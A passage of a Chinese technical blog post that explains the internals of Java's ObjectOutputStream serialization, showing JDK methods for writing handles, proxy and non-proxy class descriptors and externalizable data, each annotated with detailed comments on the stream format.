class="line"><span class="comment"> * - 将“线上句柄 ID”映射到一个**不与其他标记/保留值冲突的正区间**，便于接收端区分与校验。</span></span><br><span class="line"><span class="comment"> * - 发送端用本地下标（handle）管理对象共享关系；接收端收到 (base + n) 后，会减去 base 并在其</span></span><br><span class="line"><span class="comment"> *   自己的句柄表中取回对应对象，实现“别名/共享引用”的还原。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 与 unshared 的关系：</span></span><br><span class="line"><span class="comment"> * - 若对象按“非共享（unshared）”语义写出，就**不会登记到句柄表**，因此也不会出现对它的 TC_REFERENCE。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * I/O 细节：</span></span><br><span class="line"><span class="comment"> * - writeInt 按 **big-endian** 写 4 字节整数（Java DataOutput 的标准字节序）。</span></span><br><span class="line"><span class="comment"> * - 本方法只负责写“引用”；对象本体的首次写出由其他路径完成（并在其处进行 handles.assign 登记）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 示例（handle==3）：</span></span><br><span class="line"><span class="comment"> *   输出：0x71（TC_REFERENCE）</span></span><br><span class="line"><span class="comment"> *       + 00 7E 00 03（int 0x007E0003，即 0x7E0000 + 3 的 big-endian 表示）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeHandle</span><span class="params">(<span class="type">int</span> handle)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    bout.writeByte(TC_REFERENCE);               <span class="comment">// 0x71</span></span><br><span class="line">    bout.writeInt(baseWireHandle + handle);     <span class="comment">// baseWireHandle 固定为 0x7E0000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>writeProxyDesc</code> 则写入动态代理类的信息，包括代理实现的接口名称等。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将“动态代理类”的类描述符（proxy class descriptor）写入序列化流。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 结构（概念示意，对应反序列化时的读取顺序）：</span></span><br><span class="line"><span class="comment"> *   TC_PROXYCLASSDESC                // 0x7D：动态代理类描述符标记</span></span><br><span class="line"><span class="comment"> *   int interfaceCount               // 代理类实现的接口数量</span></span><br><span class="line"><span class="comment"> *   UTF interfaceName[interfaceCount]// 每个接口的全限定名（MUTF-8）</span></span><br><span class="line"><span class="comment"> *   classAnnotations                 // 以 Block-Data 形式书写的“类注解块”</span></span><br><span class="line"><span class="comment"> *     TC_BLOCKDATA...                // 可有零个或多个块（由 annotateProxyClass 写入）</span></span><br><span class="line"><span class="comment"> *     ...</span></span><br><span class="line"><span class="comment"> *     TC_ENDBLOCKDATA                // 0x78：注解块结束</span></span><br><span class="line"><span class="comment"> *   superClassDesc                   // 父类的类描述符（对 JDK 动态代理来说通常是 java.lang.reflect.Proxy）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：</span></span><br><span class="line"><span class="comment"> * - 与普通类（TC_CLASSDESC）不同，动态代理类使用 TC_PROXYCLASSDESC，并写出“接口列表”而不是字段表。</span></span><br><span class="line"><span class="comment"> * - “类注解块”是留给子类扩展用的钩子（annotateProxyClass）；默认不写内容，但必须用</span></span><br><span class="line"><span class="comment"> *   Block-Data 包裹，并以 TC_ENDBLOCKDATA 结束，保证协议对齐。</span></span><br><span class="line"><span class="comment"> * - 类描述符对象（ObjectStreamClass，简称 desc）也会参与句柄共享；允许后续以 TC_REFERENCE 回指。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeProxyDesc</span><span class="params">(ObjectStreamClass desc, <span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1) 写入“动态代理类描述符”标记（结构化标记，不属于块数据）</span></span><br><span class="line">    bout.writeByte(TC_PROXYCLASSDESC); <span class="comment">// 0x7D</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 为“类描述符对象本身”分配/登记句柄，以便后续引用（除非采用 unshared 语义）</span></span><br><span class="line">    <span class="comment">//    - unshared == true  ：不登记到句柄表（后续不能通过 TC_REFERENCE 回指这个 desc）</span></span><br><span class="line">    <span class="comment">//    - unshared == false ：登记，使之可共享（常规路径）</span></span><br><span class="line">    handles.assign(unshared ? <span class="literal">null</span> : desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 写出“该代理类实现的接口列表”</span></span><br><span class="line">    <span class="comment">//    - desc.forClass() 返回此描述符对应的运行时 Class（这里是一个 Proxy 生成的类）</span></span><br><span class="line">    <span class="comment">//    - getInterfaces() 返回代理类直接实现的接口数组</span></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    Class&lt;?&gt;[] ifaces = cl.getInterfaces();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.1 先写接口数量（4 字节 int）</span></span><br><span class="line">    bout.writeInt(ifaces.length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.2 逐个写接口名（MUTF-8，使用 getName() 的全限定名形式，如 &quot;java.lang.Runnable&quot;）</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ifaces.length; i++) &#123;</span><br><span class="line">        bout.writeUTF(ifaces[i].getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 写“类注解块”（classAnnotations）：</span></span><br><span class="line">    <span class="comment">//    - 按协议，此部分必须以 Block-Data 模式写入（可能为空）</span></span><br><span class="line">    <span class="comment">//    - 默认实现的 annotateProxyClass(cl) 不写任何内容；子类可重写添加自定义字节</span></span><br><span class="line">    <span class="comment">//    - 由于这是留给子类扩展的“开放区域”，故在真正写入注解前切换到块数据模式</span></span><br><span class="line">    bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.1 安全检查（仅当当前 ObjectOutputStream 是自定义子类时才进行）：</span></span><br><span class="line">    <span class="comment">//     - isCustomSubclass()：判断本对象是否为 OOS 的自定义子类（而非 JDK 原生类）</span></span><br><span class="line">    <span class="comment">//     - ReflectUtil.checkPackageAccess(cl)：在启用 SecurityManager 的环境中，</span></span><br><span class="line">    <span class="comment">//       校验是否允许访问 cl 所在包（避免非受信子类借注解扩展对敏感类写入信息）</span></span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="literal">null</span> &amp;&amp; isCustomSubclass()) &#123;</span><br><span class="line">        ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.2 允许子类在“类描述符注解”区域写入自定义数据（会被当作 Block-Data 片段）</span></span><br><span class="line">    <span class="comment">//     - 默认实现通常什么都不写</span></span><br><span class="line">    annotateProxyClass(cl);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.3 结束注解块写入：切回非块模式，并写 TC_ENDBLOCKDATA（注解结束标记）</span></span><br><span class="line">    <span class="comment">//     - 注意：注解数据内容本身是以若干 TC_BLOCKDATA/TC_BLOCKDATALONG 块写的，</span></span><br><span class="line">    <span class="comment">//       这里切回非块模式是为了写结构化的“结束标记”</span></span><br><span class="line">    bout.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">    bout.writeByte(TC_ENDBLOCKDATA); <span class="comment">// 0x78</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 递归写出“父类”的类描述符（superClassDesc）：</span></span><br><span class="line">    <span class="comment">//    - 对 JDK 动态代理类而言，其父类通常是 java.lang.reflect.Proxy</span></span><br><span class="line">    <span class="comment">//    - 这里强制使用“共享语义”（false），这样父类描述符也可被后续引用，避免重复写入</span></span><br><span class="line">    writeClassDesc(desc.getSuperDesc(), <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>writeNonProxyDesc</code> 则写入普通类的基本信息。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将“普通类”（非动态代理类）的类描述符写入到序列化流中。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 写出结构（概念示意，对应接收端读取顺序）：</span></span><br><span class="line"><span class="comment"> *   TC_CLASSDESC                // 0x72：普通类描述符标记</span></span><br><span class="line"><span class="comment"> *   classDescBody               // 类名、SUID、类标志、字段表、可选注解块占位等（见下）</span></span><br><span class="line"><span class="comment"> *   classAnnotations            // 以 Block-Data 方式写出的“类注解块”（可为空）</span></span><br><span class="line"><span class="comment"> *     TC_BLOCKDATA...           // 若有注解，由 annotateClass 写入的原始字节块</span></span><br><span class="line"><span class="comment"> *     ...</span></span><br><span class="line"><span class="comment"> *     TC_ENDBLOCKDATA           // 0x78：注解块结束标记</span></span><br><span class="line"><span class="comment"> *   superClassDesc              // 父类的类描述符（递归相同格式，直至 Object 的 TC_NULL）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 关键点：</span></span><br><span class="line"><span class="comment"> * - 与动态代理类（TC_PROXYCLASSDESC）不同，普通类在“类体”里写**字段表**而非接口列表。</span></span><br><span class="line"><span class="comment"> * - 类描述符对象（ObjectStreamClass, desc）也参与句柄共享（handles），以避免重复输出。</span></span><br><span class="line"><span class="comment"> * - “类注解块”是留给子类扩展（annotateClass）的开放区域，必须用 Block-Data 包裹并以</span></span><br><span class="line"><span class="comment"> *   TC_ENDBLOCKDATA 结束，随后才写父类描述符。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeNonProxyDesc</span><span class="params">(ObjectStreamClass desc, <span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1) 结构化标记：普通类描述符</span></span><br><span class="line">    bout.writeByte(TC_CLASSDESC); <span class="comment">// 0x72</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 为“类描述符对象本身”分配/登记句柄（除非按 unshared 语义不共享）</span></span><br><span class="line">    <span class="comment">//    - unshared == true  ：不登记到句柄表（后续不能 TC_REFERENCE 回指该 desc）</span></span><br><span class="line">    <span class="comment">//    - unshared == false ：登记，可共享（常规）</span></span><br><span class="line">    handles.assign(unshared ? <span class="literal">null</span> : desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 写入“类描述符主体”（classDescBody）：</span></span><br><span class="line">    <span class="comment">//    - 内容包括：类名（UTF）、serialVersionUID（long）、类标志（byte）、字段数量（short）、</span></span><br><span class="line">    <span class="comment">//      字段表（类型码/签名 + 字段名 + 对象字段的签名 UTF）、以及一个“注解块的占位”（随后单独写）</span></span><br><span class="line">    <span class="comment">//    - 不同协议版本对“是否允许类描述符写钩子”处理不同：</span></span><br><span class="line">    <span class="keyword">if</span> (protocol == PROTOCOL_VERSION_1) &#123;</span><br><span class="line">        <span class="comment">// 旧协议（stream protocol v1）不调用写钩子（writeClassDescriptor），</span></span><br><span class="line">        <span class="comment">// 直接让描述符按旧格式把主体写入。</span></span><br><span class="line">        <span class="comment">// 典型地，它会写出与 v1 兼容的 classDescBody。</span></span><br><span class="line">        desc.writeNonProxy(<span class="built_in">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 新协议（stream protocol v2，JDK 默认）：调用可被子类覆写的钩子，</span></span><br><span class="line">        <span class="comment">// 允许自定义类描述符的主体写法（默认实现等价于 v2 格式的标准输出）。</span></span><br><span class="line">        writeClassDescriptor(desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 写“类注解块”（classAnnotations）</span></span><br><span class="line">    <span class="comment">//    - 这部分必须在 Block-Data 模式下写（可能为空）；</span></span><br><span class="line">    <span class="comment">//    - 默认 annotateClass(cl) 不写内容；自定义子类可在此输出额外元数据（按块写）。</span></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切换到块数据模式，准备写注解块的原始字节（若有）</span></span><br><span class="line">    bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 安全检查（仅当当前 ObjectOutputStream 是“自定义子类”时启用）：</span></span><br><span class="line">    <span class="comment">// - isCustomSubclass()：判断是否为 OOS 的用户自定义子类；</span></span><br><span class="line">    <span class="comment">// - ReflectUtil.checkPackageAccess(cl)：在启用 SecurityManager 时校验包访问权限，</span></span><br><span class="line">    <span class="comment">//   避免非受信子类对敏感类写入注解数据。</span></span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="literal">null</span> &amp;&amp; isCustomSubclass()) &#123;</span><br><span class="line">        ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 允许子类向“类注解块”写入自定义数据（作为一个或多个 TC_BLOCKDATA* 片段）；</span></span><br><span class="line">    <span class="comment">// 默认实现通常不写任何内容。</span></span><br><span class="line">    annotateClass(cl);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结束注解块：切回“非块模式”以写结构化的结束标记，然后写 TC_ENDBLOCKDATA(0x78)</span></span><br><span class="line">    bout.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">    bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 递归写出“父类”的类描述符：</span></span><br><span class="line">    <span class="comment">//    - 按协议，这里必须紧随注解块之后写父类描述符（或 TC_NULL 表示无父类）；</span></span><br><span class="line">    <span class="comment">//    - 使用共享语义（false），使父类描述符也能被后续引用，避免重复写。</span></span><br><span class="line">    writeClassDesc(desc.getSuperDesc(), <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中写入“类描述符主体”实际调用的都是 <code>desc.writeNonProxy</code> 函数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">writeClassDescriptor</span><span class="params">(ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    desc.writeNonProxy(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>writeNonProxy</code> 会将类名、类型、字段等信息写入：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将“普通类（非动态代理）”的类描述符主体信息写入到给定的 ObjectOutputStream。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：</span></span><br><span class="line"><span class="comment"> * - 本方法仅负责 **classDesc 的主体**（类名、SUID、flags、字段表）；“类注解块”和“父类描述符”</span></span><br><span class="line"><span class="comment"> *   由上层的 writeNonProxyDesc(...) 负责紧随其后写出。</span></span><br><span class="line"><span class="comment"> * - 与动态代理类（TC_PROXYCLASSDESC）不同，普通类使用 TC_CLASSDESC 并包含字段表。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">writeNonProxy</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 1) 写类的“二进制名”（例如 java.lang.String），使用 MUTF-8（writeUTF 会写 2 字节长度前缀）</span></span><br><span class="line">    out.writeUTF(name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 写 serialVersionUID（long，8 字节，大端）</span></span><br><span class="line">    out.writeLong(getSerialVersionUID());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 组装并写入“类标志位”（flags）</span></span><br><span class="line">    <span class="type">byte</span> <span class="variable">flags</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (externalizable) &#123;</span><br><span class="line">        <span class="comment">// Externalizable：实例数据由对象自己的 writeExternal 写；读取端也走 readExternal</span></span><br><span class="line">        flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 协议版本控制：</span></span><br><span class="line">        <span class="comment">// - 在 v2（默认）协议下，Externalizable 的数据需要以 Block-Data 包裹（读端据此按块读取）</span></span><br><span class="line">        <span class="comment">// - 在 v1 协议下，不使用 Block-Data 包裹，按老格式读写</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">protocol</span> <span class="operator">=</span> out.getProtocolVersion();</span><br><span class="line">        <span class="keyword">if</span> (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;</span><br><span class="line">            flags |= ObjectStreamConstants.SC_BLOCK_DATA;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (serializable) &#123;</span><br><span class="line">        <span class="comment">// Serializable：按默认/自定义 writeObject 机制写实例数据</span></span><br><span class="line">        flags |= ObjectStreamConstants.SC_SERIALIZABLE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hasWriteObjectData) &#123;</span><br><span class="line">        <span class="comment">// 该类声明了私有的 writeObject(ObjectOutputStream)：</span></span><br><span class="line">        <span class="comment">// - 读端据此知道：除默认字段外，还将出现一段由 writeObject 写入的“自定义数据区”</span></span><br><span class="line">        <span class="comment">// - 在 v2 协议下，自定义数据区同样以 Block-Data 包裹</span></span><br><span class="line">        flags |= ObjectStreamConstants.SC_WRITE_METHOD;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isEnum) &#123;</span><br><span class="line">        <span class="comment">// 枚举类标记：读端据此采用枚举的特殊规则（值以“常量名字符串”表示）</span></span><br><span class="line">        flags |= ObjectStreamConstants.SC_ENUM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    out.writeByte(flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 写字段表</span></span><br><span class="line">    <span class="comment">// - 仅包含“可持久化字段”（非 static / 非 transient），顺序由 ObjectStreamClass 预先规范化</span></span><br><span class="line">    <span class="comment">// - 字段条目结构：</span></span><br><span class="line">    <span class="comment">//     [1字节 typecode][UTF 字段名][若为非原始类型再写 UTF 的签名 typeString]</span></span><br><span class="line">    out.writeShort(fields.length);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">        <span class="type">ObjectStreamField</span> <span class="variable">f</span> <span class="operator">=</span> fields[i];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.1 字段类型码</span></span><br><span class="line">        out.writeByte(f.getTypeCode());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.2 字段名（UTF）</span></span><br><span class="line">        out.writeUTF(f.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.3 对于“非原始类型字段”，还需写“类型签名字符串”（例如 &quot;Ljava/lang/String;&quot;、&quot;[I&quot;）</span></span><br><span class="line">        <span class="comment">//     写入时采用“对象字符串”语义（可被句柄引用复用），而不是简单的 writeUTF</span></span><br><span class="line">        <span class="keyword">if</span> (!f.isPrimitive()) &#123;</span><br><span class="line">            out.writeTypeString(f.getTypeString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="writeExternalData"><a href="#writeExternalData" class="headerlink" title="writeExternalData"></a>writeExternalData</h4><p>当一个类实现了 <code>Externalizable</code> 接口且不是代理类的对象进行序列化的时候会调用 <code>writeExternalData</code> 写入实例数据。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过调用对象自身的 writeExternal() 方法，写出其 Externalizable 数据区。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 协议要点（默认使用 Stream Protocol Version 2）：</span></span><br><span class="line"><span class="comment"> * - 在 v2 下，外部化数据必须被“块数据”（Block-Data）包裹：</span></span><br><span class="line"><span class="comment"> *     setBlockDataMode(true)</span></span><br><span class="line"><span class="comment"> *       → obj.writeExternal(this)   // 由对象自行写出原始字段/对象等</span></span><br><span class="line"><span class="comment"> *     setBlockDataMode(false)</span></span><br><span class="line"><span class="comment"> *     writeByte(TC_ENDBLOCKDATA)    // 0x78，标记外部化数据区结束</span></span><br><span class="line"><span class="comment"> * - 在 v1 下，不使用 Block-Data 包裹（兼容旧协议）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义区别：</span></span><br><span class="line"><span class="comment"> * - Externalizable：对象完全掌控序列化内容（实现 writeExternal/readExternal），</span></span><br><span class="line"><span class="comment"> *   不走默认的 defaultWriteObject/字段自动遍历逻辑。</span></span><br><span class="line"><span class="comment"> * - 因此在执行 writeExternal 时，会清空与“默认序列化路径”相关的上下文（curContext/curPut），</span></span><br><span class="line"><span class="comment"> *   防止对象在 writeExternal 中错误地调用 defaultWriteObject/putFields 等 API。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeExternalData</span><span class="params">(Externalizable obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 暂存并清空 PutFields 上下文：</span></span><br><span class="line">    <span class="comment">// - curPut 仅在“默认字段写出”路径（putFields / writeFields）中使用；</span></span><br><span class="line">    <span class="comment">// - Externalizable 不应与 putFields 混用，清空可防误用（否则应抛 NotActiveException）。</span></span><br><span class="line">    <span class="type">PutFieldImpl</span> <span class="variable">oldPut</span> <span class="operator">=</span> curPut;</span><br><span class="line">    curPut = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// （可选）调试轨迹增强：记录“正在写外部化数据”</span></span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack.push(<span class="string">&quot;writeExternal data&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 暂存并清空“序列化回调上下文”：</span></span><br><span class="line">    <span class="comment">// - curContext 用于 defaultWriteObject/writeObject 等回调期间的合法性校验；</span></span><br><span class="line">    <span class="comment">// - Externalizable 路径不允许 defaultWriteObject/writeFields，因此将其置空。</span></span><br><span class="line">    <span class="type">SerialCallbackContext</span> <span class="variable">oldContext</span> <span class="operator">=</span> curContext;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        curContext = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (protocol == PROTOCOL_VERSION_1) 